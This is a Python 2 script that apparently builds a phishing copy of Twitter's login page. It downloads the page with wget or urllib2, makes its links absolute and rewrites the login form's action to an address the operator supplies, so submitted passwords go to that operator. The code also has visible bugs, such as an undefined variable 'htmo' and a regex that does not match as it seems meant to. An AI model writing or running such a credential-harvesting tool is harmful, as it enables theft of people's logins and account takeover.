# -*- coding: utf-8 -*-
# make_fishing_site.py
from lxml import html
import subprocess
import os, sys, time, re, shutil, urllib2
import pprint

def relative(clonesite, base):
    fullpath = "./clone/index.html"
    subpath = "./clone/index2.html"
    before = r'action="*"'
    after = 'action="' + raw_input('[+] rewrite action attribute with: ') + '""'

    with open(clonesite, "r") as rf:
        doc = html.parse(rf).getroot()
        html.make_links_absolute(doc, base)
        rehtml = html.tostring(doc, pretty_print=True, encoding="utf-8")

        try:
            filewrite = file(subpath, "w")
            filewrite.write(rehtml)
        except:
            print "[+] Couldn't open the html file."
        finally:
            rf.close()

        fileopen = file(subpath, "r").readlines()
        filewrite = file(subpath, "w")

        try:
            for line in fileopen:
                match = re.search('post', line, flags=re.IGNORECASE)
                method_post = re.search("method=post", line, flags=re.IGNORECASE)

                if match or method_post:
                    line = re.sub(before, after, line)
                filewrite.write(line)
        except:
            print "[+] Failed to modify the html file."
        finally:
            filewrite.close()

        try:
            os.remove(fullpath)
            shutil.copyfile(subpath, fullpath)
            os.remove(subpath)
        except:
            print "[+] Failed to change the index2.html to the index.html."
                
def clone(url):
    user_agent = "Mozilla/5.0 (Windows; Intel Mac OS X) Chrome/45.0.2454.101 Safari/537.36"
    try:
        wget = 0
        if os.path.isfile("/usr/local/bin/wget"):
            wget = 1
        if os.path.isfile("/usr/local/wget"):
            wget = 1
        if os.path.isfile("/usr/bin/wget"):
            wget = 1
        
        if wget == 1:
            subprocess.Popen('cd %s;wget --no-check-certificate -O index.html -c -k -U "%s" "%s"; ' % (setdir, user_agent, url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        if wget == 0:
            headers = { 'User-Agent' : user_agent }
            req = urllib2.Request(url, None, headers)
            html = urllib2.urlopen(req).read()
            if len(htmo) > 1:
                try:
                    filewrite = file(setdir + "/index.html", "w")
                    filewrite.write(html)
                except:
                    print "[+] Failed to write the content to a index.html file."
                finally:
                    filewrite.close()
    except:
        print "[+] Failed to download the target site."

if __name__ == '__main__':
    #setdir = os.path.join(os.path.expanduser('~'), '/clone')
    setdir = './clone'
    if not os.path.isdir(setdir):
        os.makedirs(setdir)
    #URL = raw_input("The url of the site you try to base your fishing site on: "
    URL = "https://twitter.com/login"
    clone(URL)
    #domain = raw_input("The domain to use for changing a relative path to absolute path(http://**.com/).: ")
    domain = "https://twitter.com/"
    path = setdir + "/index.html"
    relative(path, domain)
    print "[+] Created the fishing site in the %s." % setdir
    
